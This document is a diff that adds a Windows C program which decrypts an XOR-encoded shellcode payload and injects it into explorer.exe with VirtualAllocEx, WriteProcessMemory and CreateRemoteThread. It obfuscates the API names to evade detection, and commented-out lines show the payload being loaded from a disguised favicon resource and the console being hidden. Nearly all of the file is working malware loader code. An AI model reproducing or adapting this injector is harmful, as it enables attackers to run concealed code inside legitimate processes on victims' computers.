@@ -1,0 +1,193 @@
+#include <windows.h>
+
+#include <assert.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <tlhelp32.h>
+
+#include "resources.h"
+
+unsigned char sVirtualAlloc[] = { 0x38, 0x6, 0x1d, 0x1a, 0xd, 0xe, 0x3, 0x2f, 0x2, 0x3, 0x0, 0xd };
+unsigned char sVirtualAllocEx[] = { 0x38, 0x6, 0x1d, 0x1a, 0xd, 0xe, 0x3, 0x2f, 0x2, 0x3, 0x0, 0xd, 0x3d, 0x17 };
+unsigned char sWriteProcessMemory[] = { 0x39, 0x1d, 0x6, 0x1a, 0x1d, 0x3f, 0x1d, 0x1, 0xd, 0xa, 0x1c, 0x1d, 0x35, 0xa, 0x2, 0x1, 0x1c, 0x16 };
+unsigned char sCreateRemoteThread[] = { 0x2d, 0x1d, 0xa, 0xf, 0xc, 0xa, 0x3d, 0xb, 0x3, 0x0, 0x1b, 0xb, 0x2c, 0x7, 0x1d, 0xb, 0xf, 0xb };
+
+unsigned char payload[] = { 0x92, 0x27, 0xec, 0x8a, 0x88, 0x87, 0xaf, 0x6e, 0x6e, 0x6f, 0x2e, 0x3f, 0x39, 0x3f, 0x3d, 0x3f, 0x38, 0x27, 0x5e, 0xbc, 0x1d, 0x27, 0xe4, 0x3c, 0xe, 0x27, 0xe4, 0x3c, 0x60, 0x27, 0xe4, 0x3c, 0x4e, 0x27, 0xe4, 0x1c, 0x28, 0x27, 0x60, 0xd9, 0x24, 0x25, 0x22, 0x5f, 0xb1, 0x27, 0x5e, 0xae, 0xc2, 0x53, 0xe, 0x12, 0x7a, 0x43, 0x4f, 0x2f, 0xaf, 0xa6, 0x62, 0x2f, 0x79, 0xae, 0x8d, 0x83, 0x3c, 0x2e, 0x3e, 0x26, 0xf3, 0x3d, 0x4f, 0xe5, 0x2c, 0x53, 0x27, 0x6f, 0xa8, 0xe4, 0xef, 0xe6, 0x6e, 0x6f, 0x6f, 0x26, 0xfd, 0xaf, 0x1b, 0x9, 0x26, 0x6e, 0xbf, 0x3e, 0xf3, 0x27, 0x77, 0x2a, 0xe5, 0x2f, 0x4f, 0x27, 0x79, 0xbf, 0x8c, 0x38, 0x26, 0x90, 0xa6, 0x2f, 0xf3, 0x5b, 0xe7, 0x26, 0x6f, 0xb9, 0x22, 0x5f, 0xb1, 0x27, 0x5e, 0xae, 0xc2, 0x2e, 0xae, 0xa7, 0x75, 0x2e, 0x6e, 0xaf, 0x56, 0x8f, 0x1a, 0x9f, 0x34, 0x6c, 0x23, 0x4a, 0x66, 0x2a, 0x56, 0xbf, 0xd, 0xb7, 0x37, 0x2a, 0xe5, 0x2f, 0x4b, 0x27, 0x79, 0xbf, 0x9, 0x2f, 0xe5, 0x63, 0x27, 0x2a, 0xf3, 0x2f, 0x73, 0x27, 0x6f, 0xbf, 0x2e, 0xe5, 0x7c, 0xe7, 0x27, 0x6f, 0xbe, 0x2e, 0x37, 0x2f, 0x20, 0x31, 0x36, 0x34, 0x2f, 0x37, 0x2e, 0x37, 0x39, 0x35, 0x27, 0xed, 0x82, 0x4f, 0x2e, 0x3c, 0x87, 0x8f, 0x37, 0x2f, 0x37, 0x35, 0x27, 0xe5, 0x6a, 0x86, 0x38, 0x91, 0x91, 0x90, 0x32, 0x26, 0xc2, 0x6e, 0x6f, 0x6e, 0x6e, 0x6f, 0x6f, 0x6e, 0x78, 0x27, 0xe2, 0xe3, 0x6f, 0x6e, 0x6f, 0x6e, 0x39, 0xd5, 0x5e, 0xe5, 0x1, 0xe8, 0x90, 0xbb, 0xc3, 0x9f, 0xda, 0xcc, 0x38, 0x2e, 0xd5, 0xc8, 0xed, 0xd2, 0xf2, 0x91, 0xbb, 0x27, 0xec, 0xaa, 0x50, 0x53, 0x69, 0x12, 0x64, 0xef, 0x94, 0x8e, 0xd, 0x6a, 0xd4, 0x29, 0x7d, 0x1d, 0x0, 0x4, 0x78, 0x36, 0x2e, 0xe7, 0xb4, 0x90, 0xba, 0xd, 0x19, 0x3, 0xc, 0x40, 0xb, 0x17, 0xa, 0x6e };
+unsigned int payload_len = sizeof(payload);
+
+char key [] = "noonxoon";
+
+LPVOID (WINAPI * pVirtualAlloc)(
+	LPVOID lpAddress,
+	SIZE_T dwSize,
+	DWORD  flAllocationType,
+	DWORD  flProtect
+);
+
+LPVOID (WINAPI * pVirtualAllocEx) (
+	HANDLE hProcess,
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD  flAllocationType,
+    DWORD  flProtect
+);
+
+BOOL (WINAPI * pWriteProcessMemory)(
+	HANDLE  hProcess,
+    LPVOID  lpBaseAddress,
+    LPCVOID lpBuffer,
+    SIZE_T  nSize,
+    SIZE_T  *lpNumberOfBytesWritten
+);
+
+HANDLE (WINAPI * pCreateRemoteThread)(
+	HANDLE                 hProcess,
+    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
+    SIZE_T                 dwStackSize,
+    LPTHREAD_START_ROUTINE lpStartAddress,
+    LPVOID                 lpParameter,
+    DWORD                  dwCreationFlags,
+    LPDWORD                lpThreadId
+);
+
+void DecryptXOR (char * pData, size_t dataLen, char * pKey, size_t keyLen ){
+	int j;
+	j = 0;
+	
+	for (int i = 0; i < dataLen; i++) {
+		if (j == keyLen - 1) j = 0;	
+		pData[i] = pData[i] ^ pKey[j];
+		j++;
+	}
+
+	return 0;
+}
+
+int Initialize(){
+	DecryptXOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx),(char *) key, sizeof(key));
+	DecryptXOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory),(char *) key, sizeof(key));
+	DecryptXOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread),(char *) key, sizeof(key));
+	DecryptXOR((char *) sVirtualAlloc, sizeof(sVirtualAlloc),(char *) key, sizeof(key));
+	
+	pVirtualAlloc = GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAlloc);
+	pVirtualAllocEx = GetProcAddress(GetModuleHandle("kernel32.dll"),sVirtualAllocEx);
+	pWriteProcessMemory = GetProcAddress(GetModuleHandle("kernel32.dll"),sWriteProcessMemory);
+	pCreateRemoteThread = GetProcAddress(GetModuleHandle("kernel32.dll"),sCreateRemoteThread);
+
+	assert(pVirtualAlloc);
+	assert(pVirtualAllocEx);
+	assert(pWriteProcessMemory);
+	assert(pCreateRemoteThread);
+
+	if (*pVirtualAlloc || 
+	    *pVirtualAllocEx || 
+		*pWriteProcessMemory || 
+		*pCreateRemoteThread){
+			printf("KERNEL LINKED\n");
+			return 0;
+		}
+
+	return -1;
+}
+
+int FindTarget(const char * procname) {
+	HANDLE hProc;
+	PROCESSENTRY32 pe32;
+	int PID = 0;
+	
+	hProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	
+	if (INVALID_HANDLE_VALUE == hProc) return 0;
+		
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+	
+	if (!Process32Next(hProc, &pe32)) {
+		CloseHandle(hProc);
+		return 0;
+	}
+	
+	while (Process32Next(hProc, &pe32)) {
+		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
+			PID = pe32.th32ProcessID;
+			break;
+		}
+	}
+	CloseHandle(hProc);
+	return PID;
+}
+
+int InjectionInProc(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
+	LPVOID pRemote = NULL;
+	HANDLE hTread = NULL;
+	
+	pRemote = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
+	pWriteProcessMemory(hProc, pRemote, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
+	
+	hTread = pCreateRemoteThread(hProc, NULL, 0, pRemote, NULL, 0, NULL);
+	
+	if(hTread != NULL) {
+		WaitForSingleObject(hTread, 500);
+		CloseHandle(hTread);
+		printf("THREAD OPENED\n");
+		return 0;
+	}
+	return -1;
+}
+
+int main(void) {
+	void * exec_mem;
+	
+	int PID = 0;
+	HANDLE hProc = NULL;
+
+	BOOL rv;
+	DWORD oldprotect = 0;
+	
+	HRSRC res;
+	HGLOBAL resHandle;
+
+	//unsigned char * payload;
+	//unsigned int payload_len;
+
+	// FreeConsole();
+	
+	Initialize();
+
+	//res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
+	//resHandle = LoadResource(NULL, res);
+
+	//assert(res);
+	//assert(resHandle);
+
+	//payload = (char *) LockResource(resHandle);
+	//payload_len = SizeofResource(NULL, res);
+
+	assert(payload);
+	assert(payload_len);
+
+	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	
+	RtlMoveMemory(exec_mem, payload, payload_len);
+
+	DecryptXOR((char *) exec_mem, payload_len, key, sizeof(key));
+
+	PID = FindTarget("explorer.exe");
+	if(PID) {
+		printf("DROP 0x%-016p\n", (void *)payload);
+		printf("DROP LEN 0x%-016p\n", (void *)payload_len);
+		printf("DROP BUF 0x%-016p\n", (void *)exec_mem);
+		printf("KEY 0x%-016p\n", (void *)key);
+		printf("P I D - %d \n", PID);
+
+		hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
+						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) PID);
+	
+		if(hProc != NULL) {
+			InjectionInProc(hProc, exec_mem, payload_len);
+			CloseHandle(hProc);
+		}
+	}
+	
+	return 0;
+}
